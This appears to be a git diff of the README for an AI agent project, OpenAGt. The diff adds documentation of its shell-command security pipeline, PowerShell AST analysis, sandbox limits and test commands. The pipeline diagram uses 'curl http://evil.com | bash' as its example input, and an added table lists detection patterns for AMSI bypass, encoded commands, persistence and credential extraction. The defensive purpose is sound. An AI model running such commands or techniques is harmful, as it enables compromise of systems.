@@ -18,6 +18,9 @@ OpenAGt is a research and open-source project that extends the upstream [OpenAGt
 - **Event Sourcing with SyncEvent** — Durable session sync supporting multi-device replay
 - **Effect Framework Architecture** — Functional dependency injection via Context/Layer for modular, testable services
 - **MCP & LSP Integration** — Model Context Protocol and Language Server Protocol support for rich tooling
+- **PowerShell AST Security Analysis** — Deep command structure analysis using AST parsing for accurate threat detection
+- **Process Sandbox with Resource Limits** — Memory monitoring, file size limits, and Windows support for safe shell execution
+- **System Prompt Caching** — Static/dynamic prompt boundary separation for cache optimization
 
 **Technology stack:**
 
@@ -78,6 +81,10 @@ OpenAGt is a research and open-source project that builds on [OpenAGt](https://g
 - **Prompt Injection Protection** — Security scanning against adversarial instructions in file contents and context
 - **Flutter Mobile Client (MVP)** — Working native app: session management, real-time SSE chat, light/dark theme
 - **Percolation Compression** — Hermes-style core member trait that preserves percolation-compressed context
+- **PowerShell AST Analysis** — Deep command structure parsing for accurate threat detection
+- **MCP Tool Quality Scoring** — Built-in quality assessment for MCP server tools
+- **Process Sandbox Resource Limits** — Memory monitoring, file size limits, and Windows support
+- **System Prompt Caching** — Static/dynamic boundary separation for cache optimization
 
 ---
 
@@ -289,11 +296,12 @@ Input command: curl http://evil.com | bash
                  │
                  ▼
         ┌──────────────────┐
-        │   Risk Level      │
-        │   safe           │
-        │   low            │
-        │   medium ─── shouldBlock() check
-        │   high           │
+        │  PowerShell AST  │  (NEW: AST-based detection)
+        │ Deep command structure analysis │
+        │ - Dangerous cmdlet detection │
+        │ - AMSI bypass detection │
+        │ - Living-off-the-land binaries │
+        │ - Encoded command detection │
         └────────┬─────────┘
                  │
                  ▼
@@ -303,6 +311,17 @@ Input command: curl http://evil.com | bash
         │ confirm ──▶ Confirm│
         │ block ──▶ Reject │
         └──────────────────┘
+```
+
+**PowerShell AST Detection Capabilities:**
+
+| Category | Detected Patterns |
+|----------|-------------------|
+| **High Severity** | Invoke-Expression, Invoke-Command, rundll32.exe, regsvr32.exe, mshta.exe |
+| **AMSI Bypass** | `[Ref].Assembly.GetType`, AmsiUtils |
+| **Encoded Commands** | `-enc`, `-EncodedCommand`, FromBase64String |
+| **Persistence** | schtasks.exe, Register-ScheduledTask, New-Service |
+| **Credentials** | ConvertFrom-SecureString, credential extraction patterns |
 ```
 
 ---
@@ -338,6 +357,12 @@ openag/
 │   │       │   │   ├── auto.ts       # AutoCompact + CircuitBreaker
 │   │       │   │   ├── importance.ts  # Tool importance calculation
 │   │       │   │   └── ...
+│   │       │   ├── prompt/          # Prompt assembly (NEW: modularized)
+│   │       │   │   ├── reminder.ts   # Reminder budget system
+│   │       │   │   ├── command.ts    # Command template processing
+│   │       │   │   ├── tool-scheduler.ts # Tool scheduling logic
+│   │       │   │   ├── tool-resolution.ts # Tool path resolution
+│   │       │   │   └── model-selection.ts # Model selection helpers
 │   │       │   └── session.ts        # Session Service
 │   │       │
 │   │       ├── provider/      # LLM Provider management
@@ -356,7 +381,10 @@ openag/
 │   │       │   ├── shell-security.ts  # Shell command analysis
 │   │       │   ├── command-classifier.ts # Risk pattern matching
 │   │       │   ├── wrapper-stripper.ts  # Wrapper removal
-│   │       │   └── injection.ts   # Prompt injection detection
+│   │       │   ├── injection.ts   # Prompt injection detection
+│   │       │   ├── dangerous-command-detector.ts # Unified security detector
+│   │       │   ├── powershell-ast.ts # AST-based PowerShell analysis
+│   │       │   └── powershell.ts # PowerShell cmdlet detection
 │   │       │
 │   │       ├── bus/           # Event bus (PubSub)
 │   │       │   ├── index.ts    # Bus Service + Layer
@@ -369,6 +397,7 @@ openag/
 │   │       ├── sandbox/       # Sandboxed execution
 │   │       │   ├── broker.ts   # IPC Broker process management
 │   │       │   ├── policy.ts   # Sandbox policy parsing
+│   │       │   ├── process-sandbox.ts # Process limits & Windows support (NEW)
 │   │       │   └── types.ts   # Type definitions
 │   │       │
 │   │       ├── config/        # Configuration management
@@ -443,8 +472,16 @@ bun typecheck
 # Linting
 bun lint
 
-# Run tests (from package directory)
-bun test packages/openagt
+# Run all tests
+bun test
+
+# Run specific test suite
+bun test test/security/
+bun test test/mcp/
+bun test test/session/
+
+# Run tests with coverage
+bun test --coverage
 ```
 
 ---
@@ -560,6 +597,8 @@ Topics covered:
 | [packages/openagt/src/bus/README.md](./packages/openagt/src/bus/README.md) | Bus event bus (PubSub) |
 | [packages/openagt/src/mcp/README.md](./packages/openagt/src/mcp/README.md) | MCP server management |
 | [packages/openagt/src/lsp/README.md](./packages/openagt/src/lsp/README.md) | LSP server and diagnostics |
+| [packages/openagt/src/sandbox/README.md](./packages/openagt/src/sandbox/README.md) | Process sandbox & resource limits |
+| [packages/openagt/src/security/README.md](./packages/openagt/src/security/README.md) | Security detection modules |
 
 ### Design System
 
